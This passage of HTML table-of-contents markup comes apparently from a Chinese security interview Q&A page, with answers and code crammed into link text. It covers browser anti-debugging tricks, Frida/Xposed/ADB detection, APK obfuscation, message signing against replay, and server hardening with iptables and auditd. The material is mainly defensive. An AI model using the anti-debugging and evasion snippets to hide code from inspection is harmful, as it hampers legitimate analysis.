href="#%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF%EF%BC%9A1-%E7%A6%81%E7%94%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7%EF%BC%9A-%E7%9B%91%E5%90%AC-DevTools-%E6%89%93%E5%BC%80%E7%8A%B6%E6%80%81%EF%BC%8C%E8%A7%A6%E5%8F%91-debugger%EF%BC%9A-2-%E6%8B%A6%E6%88%AA-console-%E8%B0%83%E8%AF%95%EF%BC%9A-%E7%A6%81%E7%94%A8-console-%EF%BC%9A-3-%E4%BB%A3%E7%A0%81%E8%87%AA%E6%AF%81%E6%9C%BA%E5%88%B6%EF%BC%9A-%E5%BD%93%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E5%88%B0-DevTools-%E8%BF%90%E8%A1%8C%E6%97%B6%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%85%B3%E9%94%AE%E5%8F%98%E9%87%8F%E6%88%96%E7%BB%88%E6%AD%A2%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-number">58.</span> <span class="toc-text">反调试技术：1. 禁用开发者工具：   - 监听 DevTools 打开状态，触发 debugger：     123456setInterval(() &#x3D;&gt; {    console.log(&quot;Checking DevTools...&quot;);    if (window.outerHeight - window.innerHeight &gt; 200) {        window.location.reload();    }}, 1000);2. 拦截 console 调试：   - 禁用 console.*：     1console.log &#x3D; function() {};3. 代码自毁机制：   - 当代码检测到 DevTools 运行时，修改关键变量或终止执行：     123if (window.navigator.webdriver) {    document.write(&quot;Debugger detected!&quot;);}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2-location-href-%E6%94%B9%E5%8F%98%E5%90%8E%EF%BC%8C%E4%BB%8D%E7%84%B6%E8%83%BD%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%89%8D%E7%9A%84-JavaScript%EF%BC%9F"><span class="toc-number">58.1.</span> <span class="toc-text">如何实现当前页面 location.href 改变后，仍然能执行之前的 JavaScript？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E4%BD%BF%E7%94%A8-setTimeout-%E6%89%A7%E8%A1%8C%E5%BB%B6%E8%BF%9F%E4%BB%BB%E5%8A%A1%EF%BC%9A-JavaScript-%E7%9A%84-setTimeout-%E6%96%B9%E6%B3%95%E4%B8%8D%E4%BC%9A%E8%A2%AB-location-href-%E5%BD%B1%E5%93%8D%EF%BC%8C%E5%8F%AF%E7%94%A8%E4%BA%8E%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%9A-2-%E4%BD%BF%E7%94%A8-window-onbeforeunload-%E7%9B%91%E5%90%AC%E8%B7%B3%E8%BD%AC%EF%BC%9A-%E5%9C%A8%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%E5%89%8D%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%9A-3-Service-Worker-%E6%96%B9%E5%BC%8F%EF%BC%9A-%E9%80%9A%E8%BF%87-Service-Worker-%E6%8C%81%E7%BB%AD%E8%BF%90%E8%A1%8C-JS-%E9%80%BB%E8%BE%91%EF%BC%8C%E5%8D%B3%E4%BD%BF%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC%EF%BC%9A"><span class="toc-number">59.</span> <span class="toc-text">方法：1. 使用 setTimeout 执行延迟任务：   - JavaScript 的 setTimeout 方法不会被 location.href 影响，可用于延迟执行代码：     1234setTimeout(() &#x3D;&gt; {    alert(&quot;This runs even after page change!&quot;);}, 3000);location.href &#x3D; &quot;https:&#x2F;&#x2F;example.com&quot;;2. 使用 window.onbeforeunload 监听跳转：   - 在页面跳转前执行代码：     1234window.onbeforeunload &#x3D; function() {    console.log(&quot;Page is leaving...&quot;);    return &quot;Are you sure?&quot;;};3. Service Worker 方式：   - 通过 Service Worker 持续运行 JS 逻辑，即使页面跳转：     123navigator.serviceWorker.register(&#39;&#x2F;worker.js&#39;).then(() &#x3D;&gt; {    console.log(&quot;Service Worker Registered!&quot;);});</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#APK-%E5%8F%8D%E7%BC%96%E8%AF%91%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E8%B7%AF%E5%BE%84%EF%BC%8C%E4%BB%A3%E8%A1%A8%E5%B7%A5%E5%85%B7%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">59.1.</span> <span class="toc-text">APK 反编译有哪几种路径，代表工具有哪些？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%EF%BC%9A-%E5%BC%80%E5%90%AF-ProGuard-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%EF%BC%9A-%E4%BD%BF%E7%94%A8-Native-C-%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%94%AE%E9%80%BB%E8%BE%91%EF%BC%8C%E9%81%BF%E5%85%8D-Java-%E5%B1%82%E8%A2%AB%E8%BD%BB%E6%98%93%E5%8F%8D%E7%BC%96%E8%AF%91%E3%80%82"><span class="toc-number">60.</span> <span class="toc-text">防御措施：- 开启 ProGuard 进行代码混淆：  12minifyEnabled trueproguardFiles getDefaultProguardFile(&#39;proguard-android-optimize.txt&#39;), &#39;proguard-rules.pro&#39;- 使用 Native C++ 代码保护关键逻辑，避免 Java 层被轻易反编译。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#App-%E8%87%AA%E6%A3%80%E5%8D%87%E7%BA%A7%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">60.1.</span> <span class="toc-text">App 自检升级场景下会存在哪些风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD%EF%BC%9A-%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-HTTPS-%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%96%B0%E5%8C%85%E4%BC%A0%E8%BE%93%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%B5%81%E9%87%8F%E7%AF%A1%E6%94%B9%E3%80%82-%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%EF%BC%8C%E6%9B%B4%E6%96%B0%E5%8C%85%E9%9C%80%E8%BF%9B%E8%A1%8C-SHA256-%E6%A0%A1%E9%AA%8C%EF%BC%9A-%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A3%80%E6%9F%A5%EF%BC%8C%E6%A0%A1%E9%AA%8C-AndroidManifest-xml-%E5%8F%8A-dex%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82"><span class="toc-number">61.</span> <span class="toc-text">防护措施：- 强制使用 HTTPS 进行更新包传输，防止流量篡改。- 签名校验，更新包需进行 SHA256 校验：  12MessageDigest md &#x3D; MessageDigest.getInstance(&quot;SHA-256&quot;);byte[] digest &#x3D; md.digest(fileBytes);- 完整性检查，校验 AndroidManifest.xml 及 dex，防止动态加载恶意代码。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E5%A5%97%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%EF%BC%8C%E8%83%BD%E5%A4%9F%E4%BF%9D%E8%AF%81%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E4%B8%8D%E5%8F%AF%E6%8A%B5%E8%B5%96%E6%80%A7%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%AD%A2%E9%87%8D%E6%94%BE%EF%BC%9F"><span class="toc-number">61.1.</span> <span class="toc-text">如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%EF%BC%9A1-%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%9A-%E9%87%87%E7%94%A8-HMAC-SHA256-%E7%AD%BE%E5%90%8D%EF%BC%8C%E7%A1%AE%E4%BF%9D%E6%B6%88%E6%81%AF%E6%9C%AA%E8%A2%AB%E7%AF%A1%E6%94%B9%EF%BC%9A-2-%E4%B8%8D%E5%8F%AF%E6%8A%B5%E8%B5%96%E6%80%A7%EF%BC%9A-%E4%BD%BF%E7%94%A8-RSA-%E7%AD%BE%E5%90%8D-%E7%A1%AE%E4%BF%9D%E6%B6%88%E6%81%AF%E6%9D%A5%E6%BA%90%E5%8F%AF%E4%BF%A1%EF%BC%9A-3-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%EF%BC%9A-%E9%87%87%E7%94%A8-%E6%97%B6%E9%97%B4%E6%88%B3-%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%88nonce%EF%BC%89%EF%BC%8C%E7%A1%AE%E4%BF%9D%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E5%94%AF%E4%B8%80%EF%BC%9A-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%AD%98%E5%82%A8-nonce%EF%BC%8C%E9%81%BF%E5%85%8D%E7%9B%B8%E5%90%8C%E8%AF%B7%E6%B1%82%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4%E3%80%82"><span class="toc-number">62.</span> <span class="toc-text">设计原则：1. 完整性：   - 采用 HMAC-SHA256 签名，确保消息未被篡改：     123Mac mac &#x3D; Mac.getInstance(&quot;HmacSHA256&quot;);mac.init(new SecretKeySpec(secretKey.getBytes(), &quot;HmacSHA256&quot;));byte[] hash &#x3D; mac.doFinal(message.getBytes());2. 不可抵赖性：   - 使用 RSA 签名 确保消息来源可信：     1234Signature sign &#x3D; Signature.getInstance(&quot;SHA256withRSA&quot;);sign.initSign(privateKey);sign.update(message.getBytes());byte[] signature &#x3D; sign.sign();3. 防止重放攻击：   - 采用 时间戳 + 随机数（nonce），确保每次请求唯一：     12345{  &quot;timestamp&quot;: 1700000000,  &quot;nonce&quot;: &quot;random-uuid&quot;,  &quot;signature&quot;: &quot;hmac_signature&quot;}   - 服务器端存储 nonce，避免相同请求重复提交。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%AE%9E%E4%BD%93%E6%A3%80%E6%B5%8B%EF%BC%9F"><span class="toc-number">62.1.</span> <span class="toc-text">如何进行实体检测？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD%EF%BC%9A-%E9%81%BF%E5%85%8D%E4%BE%9D%E8%B5%96-%E5%8D%95%E4%B8%80%E6%A0%87%E8%AF%86%E7%AC%A6%EF%BC%8C%E7%BB%BC%E5%90%88%E5%A4%9A%E4%B8%AA%E6%95%B0%E6%8D%AE%E6%BA%90%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%E3%80%82-%E9%87%87%E7%94%A8-%E7%94%9F%E7%89%A9%E8%AF%86%E5%88%AB%EF%BC%88%E6%8C%87%E7%BA%B9%E3%80%81%E4%BA%BA%E8%84%B8%EF%BC%89%E5%A2%9E%E5%BC%BA%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%80%A7%E3%80%82"><span class="toc-number">63.</span> <span class="toc-text">安全措施：- 避免依赖 单一标识符，综合多个数据源进行验证。- 采用 生物识别（指纹、人脸）增强认证安全性。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E5%92%8C%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">63.1.</span> <span class="toc-text">常见的调试方法和检测方法？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-Frida%E3%80%81Xposed-%E7%AD%89%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">63.2.</span> <span class="toc-text">如何防止 Frida、Xposed 等注入攻击？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%A3%80%E6%B5%8B-Frida-%E8%BF%9B%E7%A8%8B%EF%BC%9A-%E9%80%9A%E8%BF%87-proc-net-tcp-%E6%A3%80%E6%B5%8B-Frida-%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%EF%BC%9A-2-Xposed-Hook-%E6%A3%80%E6%B5%8B%EF%BC%9A-%E6%A3%80%E6%B5%8B-XposedBridge-jar-%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%EF%BC%9A-3-SELinux-%E5%BC%BA%E5%88%B6%E6%A8%A1%E5%BC%8F%EF%BC%9A-%E8%BF%90%E8%A1%8C-getenforce-%E5%91%BD%E4%BB%A4%EF%BC%8C%E7%A1%AE%E4%BF%9D-SELinux-%E5%A4%84%E4%BA%8E-Enforcing-%E6%A8%A1%E5%BC%8F%E3%80%82"><span class="toc-number">64.</span> <span class="toc-text">防御方法：1. 检测 Frida 进程：   - 通过 &#x2F;proc&#x2F;net&#x2F;tcp 检测 Frida 监听端口：     1Process process &#x3D; Runtime.getRuntime().exec(&quot;netstat -an&quot;);2. Xposed Hook 检测：   - 检测 XposedBridge.jar 是否存在：     1234File xposed &#x3D; new File(&quot;&#x2F;system&#x2F;framework&#x2F;XposedBridge.jar&quot;);if (xposed.exists()) {    throw new SecurityException(&quot;Xposed detected!&quot;);}3. SELinux 强制模式：   - 运行 getenforce 命令，确保 SELinux 处于 Enforcing 模式。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2%E5%BD%93%E5%89%8D%E8%AE%BE%E5%A4%87%E7%9A%84%E6%95%B0%E6%8D%AE%E6%8B%B7%E8%B4%9D%E5%88%B0%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87%EF%BC%9F"><span class="toc-number">64.1.</span> <span class="toc-text">如何防止当前设备的数据拷贝到其他设备？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%EF%BC%9A1-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%EF%BC%9A-Android-%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%EF%BC%9A-2-%E8%AE%BE%E5%A4%87%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%EF%BC%9A-%E7%BB%93%E5%90%88-Device-ID-%E7%94%A8%E6%88%B7-ID-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%EF%BC%9A-3-%E9%98%BB%E6%AD%A2-ADB-%E8%AE%BF%E9%97%AE%EF%BC%9A-%E7%9B%91%E5%90%AC-adb-%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%EF%BC%9A"><span class="toc-number">65.</span> <span class="toc-text">防御措施：1. 文件权限控制：   - Android 限制文件访问：     12File file &#x3D; new File(context.getFilesDir(), &quot;data.txt&quot;);file.setReadable(false, false);2. 设备绑定机制：   - 结合 Device ID + 用户 ID 进行数据绑定：     1234{  &quot;device_id&quot;: &quot;abcd1234&quot;,  &quot;user_id&quot;: &quot;user5678&quot;}3. 阻止 ADB 访问：   - 监听 adb 连接状态：     1234String adbStatus &#x3D; Settings.Global.getString(getContentResolver(), Settings.Global.ADB_ENABLED);if (&quot;1&quot;.equals(adbStatus)) {    throw new SecurityException(&quot;ADB detected!&quot;);}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E6%8C%82%E6%9C%89%E5%87%A0%E7%A7%8D%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">65.1.</span> <span class="toc-text">外挂有几种类型的实现方式？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%EF%BC%9A-%E6%A3%80%E6%B5%8B%E5%86%85%E5%AD%98%E4%BF%AE%E6%94%B9%EF%BC%8C%E5%90%AF%E7%94%A8-Integrity-Check%E3%80%82-%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%AA%8C%E8%AF%81%E5%85%B3%E9%94%AE%E6%95%B0%E6%8D%AE%EF%BC%8C%E9%81%BF%E5%85%8D%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%AF%A1%E6%94%B9%E3%80%82"><span class="toc-number">66.</span> <span class="toc-text">防御措施：- 检测内存修改，启用 Integrity Check。- 使用服务器验证关键数据，避免客户端篡改。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%9C%AA%E7%BB%8F%E7%94%A8%E6%88%B7%E6%8E%88%E6%9D%83%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%EF%BC%9F"><span class="toc-number">66.1.</span> <span class="toc-text">如何避免未经用户授权获取权限？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8%E5%B2%97"><span class="toc-number">67.</span> <span class="toc-text">基础设施安全岗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DDoS-CC-%E5%A6%82%E4%BD%95%E6%9C%89%E6%95%88%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%BA%94%E6%80%A5%EF%BC%9F"><span class="toc-number">67.1.</span> <span class="toc-text">DDoS&#x2F;CC 如何有效防御与应急？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%AB%8B%E5%8D%B3%E5%B0%81%E7%A6%81%E6%94%BB%E5%87%BB-IP%EF%BC%9A-%E5%88%87%E6%8D%A2%E5%A4%87%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%B8%9A%E5%8A%A1%E4%B8%AD%E6%96%AD%E3%80%82"><span class="toc-number">68.</span> <span class="toc-text">应急方案：- 立即封禁攻击 IP：  1iptables -A INPUT -s &lt;malicious_ip&gt; -j DROP- 切换备用服务器，防止业务中断。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%B9%E7%BD%91%E7%BB%9C%E5%8C%BA%E5%9F%9F%E8%BF%9B%E8%A1%8C%E5%88%92%E5%88%86%EF%BC%9F"><span class="toc-number">68.1.</span> <span class="toc-text">如何对网络区域进行划分？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E4%B8%8E-VPC-%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-number">68.2.</span> <span class="toc-text">经典网络与 VPC 的优势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E5%9F%BA%E7%BA%BF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">68.3.</span> <span class="toc-text">主机最重要的基线是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%EF%BC%9A1-%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99%EF%BC%9A-%E5%85%B3%E9%97%AD%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%9A-2-%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%EF%BC%9A-%E5%90%AF%E7%94%A8-auditd-%E8%AE%B0%E5%BD%95%E5%85%B3%E9%94%AE%E6%93%8D%E4%BD%9C%EF%BC%9A-3-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E4%BB%85%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A-IP-%E7%99%BB%E5%BD%95%EF%BC%9A"><span class="toc-number">69.</span> <span class="toc-text">安全基线：1. 最小权限原则：   - 关闭不必要的服务：     1systemctl disable telnet2. 日志审计：   - 启用 auditd 记录关键操作：     1auditctl -w &#x2F;etc&#x2F;passwd -p wa -k passwd_change3. 访问控制：   - 仅允许特定 IP 登录：     1iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%87%BA%E7%BD%91%E7%9A%84%E4%BB%B7%E5%80%BC%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">69.1.</span> <span class="toc-text">禁止出网的价值有哪些？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%96%BD%E6%96%B9%E6%B3%95%EF%BC%9A-%E9%85%8D%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%EF%BC%9A"><span class="toc-number">70.</span> <span class="toc-text">实施方法：- 配置防火墙规则：  1iptables -A OUTPUT -p tcp -j REJECT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%8B%E7%9A%84%E7%BD%91%E7%BB%9C%E5%92%8C%E4%B8%BB%E6%9C%BA%E5%B7%AE%E5%BC%82%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%BC%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B0%E7%9A%84%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">70.1.</span> <span class="toc-text">云原生下的网络和主机差异是什么？会有哪些新的风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E9%A3%8E%E9%99%A9%EF%BC%9A1-%E5%8A%A8%E6%80%81-IP-%E5%8F%98%E5%8C%96%EF%BC%9A-%E4%BC%A0%E7%BB%9F-ACL-%E8%A7%84%E5%88%99%E9%9A%BE%E4%BB%A5%E9%80%82%E9%85%8D%E3%80%822-%E6%A8%AA%E5%90%91%E6%94%BB%E5%87%BB%E9%A3%8E%E9%99%A9%EF%BC%9A-%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB%E4%B8%8D%E8%B6%B3%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E5%9C%A8%E5%90%8C%E4%B8%80%E9%9B%86%E7%BE%A4%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E3%80%82"><span class="toc-number">71.</span> <span class="toc-text">新风险：1. 动态 IP 变化：   - 传统 ACL 规则难以适配。2. 横向攻击风险：   - 容器网络隔离不足，攻击者可在同一集群内横向移动。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%90%91-HTTPS-%E4%BB%A3%E7%90%86%EF%BC%9F"><span class="toc-number">71.1.</span> <span class="toc-text">如何实现反向 HTTPS 代理？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx-%E9%85%8D%E7%BD%AE%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%9A"><span class="toc-number">72.</span> <span class="toc-text">Nginx 配置反向代理：1234567891011server {    listen 443 ssl;    server_name example.com;        ssl_certificate &#x2F;etc&#x2F;nginx&#x2F;cert.pem;    ssl_certificate_key &#x2F;etc&#x2F;nginx&#x2F;key.pem;    location &#x2F; {        proxy_pass https:&#x2F;&#x2F;backend.server.com;    }}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5%E9%81%BF%E5%85%8D%E9%9D%9E%E9%A2%84%E6%9C%9F%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%EF%BC%9F"><span class="toc-number">72.1.</span> <span class="toc-text">如何通过技术手段避免非预期端口开放？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%9A-2-%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC%E7%9B%91%E6%B5%8B%EF%BC%9A-3-%E5%BA%94%E7%94%A8%E5%B1%82%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E9%85%8D%E7%BD%AE-Nginx-%E4%BB%85%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A-IP-%E8%AE%BF%E9%97%AE%EF%BC%9A"><span class="toc-number">73.</span> <span class="toc-text">方法：1. 使用防火墙：   1iptables -A INPUT -p tcp --dport 3306 -j DROP2. 端口监听监测：   1netstat -tulnp | grep LISTEN3. 应用层访问控制：   - 配置 Nginx 仅允许特定 IP 访问：     12allow 192.168.1.100;deny all;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E7%89%B9%E6%9C%89%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">73.1.</span> <span class="toc-text">容器存在哪些特有安全风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD%EF%BC%9A-%E9%99%90%E5%88%B6%E5%AE%B9%E5%99%A8%E6%9D%83%E9%99%90%EF%BC%9A-%E4%BD%BF%E7%94%A8%E5%8F%AF%E4%BF%A1%E9%95%9C%E5%83%8F%E6%9D%A5%E6%BA%90%E3%80%82"><span class="toc-number">74.</span> <span class="toc-text">防护措施：- 限制容器权限：  1docker run --cap-drop&#x3D;ALL- 使用可信镜像来源。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E7%BB%B4%E8%87%AA%E5%B1%8F%E5%8C%96%E7%9A%84%E9%9A%BE%E7%82%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">74.1.</span> <span class="toc-text">运维自屏化的难点是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E8%AF%AD%E8%A8%80%E5%AF%B9%E4%BA%8E%E7%B3%BB%E7%BB%9F-CA-%E8%AF%81%E4%B9%A6%E7%9A%84%E4%BF%A1%E4%BB%BB%E6%83%85%E5%86%B5%E6%9C%89%E4%BD%95%E4%B8%8D%E5%90%8C%EF%BC%9F%E5%A6%82%E4%BD%95%E8%AE%A9%E5%90%84%E8%AF%AD%E8%A8%80%E4%BF%A1%E4%BB%BB%E7%B3%BB%E7%BB%9F-CA-%E8%AF%81%E4%B9%A6%EF%BC%9F"><span class="toc-number">74.2.</span> <span class="toc-text">不同语言对于系统 CA 证书的信任情况有何不同？如何让各语言信任系统 CA 证书？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%88%AA%E5%A4%96%E8%81%94%EF%BC%8C%E5%90%84%E8%87%AA%E5%88%A9%E5%BC%8A%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">74.3.</span> <span class="toc-text">简单描述有哪几种方式实现服务器截外联，各自利弊是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E5%BA%94%E5%AF%B9%E5%B2%97"><span class="toc-number">75.</span> <span class="toc-text">威胁应对岗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 